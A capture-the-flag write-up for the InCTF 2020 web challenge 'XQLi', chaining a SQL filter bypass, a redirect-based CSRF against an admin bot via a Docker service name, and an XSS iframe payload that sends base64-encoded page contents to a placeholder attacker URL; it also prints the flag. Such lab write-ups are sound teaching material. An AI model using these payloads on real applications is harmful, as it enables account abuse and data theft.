---
title: XQLi - InCTF Internationals 2020
date: 2020-08-26
author: Az3z3l
author_url: https://twitter.com/Az3z3l
categories:
 - Web Exploitation
tags:
 - CSRF
 - SQLi
 - InCTFi
 - docker-ssrf
 - XSS
---

**tl;dr**

+ SQLi - `lcase('inKypinKy')id from dual`
+ Creating User - `header("location:http://web/user.php?session=1111-22222-1234&sub=submit");`
+ Retrieving Flag - `header("location:http://web/flag.php?session=<iframe id="a" src="http://web/flag.php?session=1111-22222-1234&sub=submit" onload=window.location="<URL>?"+btoa(document.getElementById('a').contentWindow.document.body.innerText)>&sub=submit")`

<!--more-->

**Challenge points:** 1000

**Challenge Author:** [Az3z3l](https://twitter.com/Az3z3l)

**Source Code:** [XQLi](https://github.com/Az3z3l/XQLi) or [here](XQLi.tar.gz)

## Challenge Description

What is my perfect crime? I break into Tiffany's at midnight. Do I go for the vault? No, I go for the chandelier. It's priceless. As I'm taking it down, a woman catches me. She tells me to stop. It's her father's business. She's Tiffany. I say no. We make...... All that and he locked himself out the website that had a secret code to break into the place :/ . Help him find the code?

## Solution

**Part - I:**

On looking into the source, one can find a text file, that'll reveal this is a sqli. The users are allowed to enter any query they want(there are some filters though) after select. 

`Select <your input>`.

The goal is to select "inkypinky" as id.

The intended method is to use lcase function along with unicode characters that change to ascii on to bypass the filters.

The unicode character [K](https://www.compart.com/en/unicode/U+212A) can be used here.

Payloads:
 - `lcase('inKypinKy')id from dual`
 - `select X'696e6b7970696e6b79' as id from dual`
 - `case when 0=1 then 'from' else chr(105,110,107,121,112,105,110,107,121) end as id`

**Part - II:**

After completing the SQLi phase, you'll be redirected to ./reception.php. On checking the source code of this, you'll be able to find a hidden text file that has the following.

```
version: '2'

services:
   web:
      # build the web server here

   node:
      # implement an A(dm)I(n) bot that would send only funny links to $(YOU_KNOW_WHO)

   db:
      #  database to be added here
```

This is a crude docker-compose.yml file. The web-server is running under the name `web`. One technique to access the internal ip of docker is use the service name. i.e, http://web will correspond to the internal ip of the web service. Since it is a docker and no specific networks have been provided http://127.0.0.1 and http://localhost won't work. 

Other than this, there are three links: 
 - ./url.php - urls for admin bot to visit
 - ./user.php - tokens/session ids to be created by admin bot
 - ./flag.php - admin bot submits token and gets flag

 To get the flag, we need to create a token. The timeout for the bot is also set to be very less(1 second). This rules out many options(the page might take some time to load if one intends to use js for CSRF) normally uses in a CTF. 

 But when we use a 302 status code, the page is redirected to its target without the page from your server fully rendering. The intended way is to access the web server using http://web by redirecting from your server.

```php
<?php
header("location:http://web/user.php?session=1111-22222-1234&sub=submit");
```

This would redirect to the bot to create a new id. 


**Part - III:**

The next part would be to exfiltrate the flag from flag.php. Even here the same method(http://web) can be used to access the server as admin. 

The flag can be exfiltrated using the XSS vulnerability present in ./flag.php. The word `script` is blocked. But any other element ought to work. 

The using `frame` and `onload` attribute, the flag can be obtained. There surely are other methods though.

`<iframe id="a" src="http://web/flag.php?session=1111-22222-1234&sub=submit" onload=window.location="<URL>?"+btoa(document.getElementById('a').contentWindow.document.body.innerText)>`

would load the flag on the page and exfiltrate to your server. Being a internal docker connection, this would load much faster(making the bot's 1 second timeout useless).

Putting it together with the redirect on your server:

```php
<?php
header("location:http://web/flag.php?session=%3Ciframe+id%3D%22a%22+src%3D%22http%3A%2F%2Fweb%2Fflag.php%3Fsession%3D1111-22222-1234%26sub%3Dsubmit%22+onload%3Dwindow.location%3D%22%3CURL%3E%3F%22%2Bbtoa%28document.getElementById%28%27a%27%29.contentWindow.document.body.innerText%29%3E%26sub%3Dsubmit");
```

## Flag:

inctf{p3op13_persons_c7f_pe0p13_9986000}
